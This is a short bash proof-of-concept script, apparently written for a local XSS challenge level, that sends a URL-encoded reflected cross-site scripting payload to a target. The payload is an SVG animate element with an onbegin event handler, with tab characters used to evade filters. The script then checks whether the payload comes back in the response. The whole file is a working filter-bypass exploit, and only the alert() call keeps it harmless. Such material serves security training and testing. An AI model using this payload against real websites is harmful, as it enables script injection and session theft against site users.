#!/bin/bash
# XSS Bypass PoC: Using SVG animate element with onbegin event
# Target: http://localhost:5000/level13
# Bypass Technique: SVG-specific event (onbegin)

TARGET="http://localhost:5000/level13"
PAYLOAD=">%3Csvg%3E%3Canimate%09attributeName=x%09from=1%09to=1%09dur=1s%09repeatCount=1%09begin=0s%09onbegin=alert%28%22XSS%22%29/%3E%3C/svg%3E"

echo "[*] Testing XSS bypass with SVG animate onbegin event"
echo "[*] Target: $TARGET"
echo "[*] Payload: ><svg><animate[...onbegin=alert(\"XSS\")/></svg>"
echo ""

RESPONSE=$(curl -s "$TARGET?name=$PAYLOAD")

if echo "$RESPONSE" | grep -q 'onbegin=alert'; then
    echo "[+] SUCCESS: SVG animate payload reflected"
    echo "[+] SVG-specific event 'onbegin' bypassed all filters"
    echo "[+] Payload executes when animation begins"
    exit 0
else
    echo "[-] FAILED: SVG animate payload not found"
    exit 1
fi
